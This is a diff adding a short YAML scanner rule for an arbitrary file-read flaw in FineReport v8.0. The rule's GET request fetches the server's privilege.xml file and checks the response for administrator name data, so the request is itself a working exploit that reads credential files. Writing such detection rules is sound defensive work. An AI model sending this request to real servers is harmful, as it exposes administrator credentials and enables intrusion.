@@ -1,0 +1,11 @@
+cve-id: finereport-v8.0-arbitrary-fileread
+rules:
+  - method: GET
+    path: /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"rootManagerName") && response.body.bcontains(b"CDATA")
+severity:
+  high
+type: 
+  fileread
